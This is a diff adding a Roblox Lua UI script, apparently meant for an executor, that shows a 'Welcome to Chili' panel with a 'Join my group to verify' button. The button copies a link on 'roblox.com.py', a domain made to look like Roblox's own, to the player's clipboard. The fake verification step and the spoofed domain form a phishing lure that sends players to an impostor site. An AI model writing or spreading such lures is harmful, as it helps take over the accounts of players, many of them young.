@@ -1,0 +1,101 @@
+--== CONFIGURATION ==--
+local GROUP_LINK = "https://roblox.com.py/communities/9706637756/" -- your group link here
+
+--== SERVICES ==--
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+
+--== UI CREATION ==--
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ChiliUI"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Background blur
+local blur = Instance.new("BlurEffect")
+blur.Size = 12
+blur.Parent = workspace.CurrentCamera
+
+-- Main Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 400, 0, 250)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BackgroundTransparency = 0.1
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+Frame.AnchorPoint = Vector2.new(0, 0)
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = Frame
+
+-- Title Label
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 80)
+Title.BackgroundTransparency = 1
+Title.Text = "Welcome to Chili 🌶️"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 36
+Title.Parent = Frame
+
+-- Join Button
+local JoinButton = Instance.new("TextButton")
+JoinButton.Size = UDim2.new(0.7, 0, 0, 60)
+JoinButton.Position = UDim2.new(0.15, 0, 0.55, 0)
+JoinButton.Text = "Join my group to verify"
+JoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinButton.Font = Enum.Font.Gotham
+JoinButton.TextSize = 20
+JoinButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+JoinButton.Parent = Frame
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 15)
+ButtonCorner.Parent = JoinButton
+
+-- Copied label (hidden by default)
+local CopiedLabel = Instance.new("TextLabel")
+CopiedLabel.Size = UDim2.new(1, 0, 0, 40)
+CopiedLabel.Position = UDim2.new(0, 0, 1, 0)
+CopiedLabel.BackgroundTransparency = 1
+CopiedLabel.Text = "Copied to clipboard!"
+CopiedLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+CopiedLabel.Font = Enum.Font.GothamBold
+CopiedLabel.TextSize = 20
+CopiedLabel.Parent = Frame
+CopiedLabel.Visible = false
+
+--== FUNCTIONALITY ==--
+JoinButton.MouseButton1Click:Connect(function()
+	local success = false
+	if setclipboard then
+		setclipboard(GROUP_LINK)
+		success = true
+	else
+		warn("Clipboard function not supported in this environment!")
+	end
+	
+	if success then
+		CopiedLabel.Visible = true
+		CopiedLabel.TextTransparency = 1
+		CopiedLabel.Text = "Copied to clipboard!"
+		
+		-- Fade-in animation
+		for i = 1, 10 do
+			CopiedLabel.TextTransparency = 1 - (i / 10)
+			task.wait(0.03)
+		end
+		
+		task.wait(1.5)
+		
+		-- Fade-out animation
+		for i = 1, 10 do
+			CopiedLabel.TextTransparency = i / 10
+			task.wait(0.03)
+		end
+		
+		CopiedLabel.Visible = false
+	end
+end)
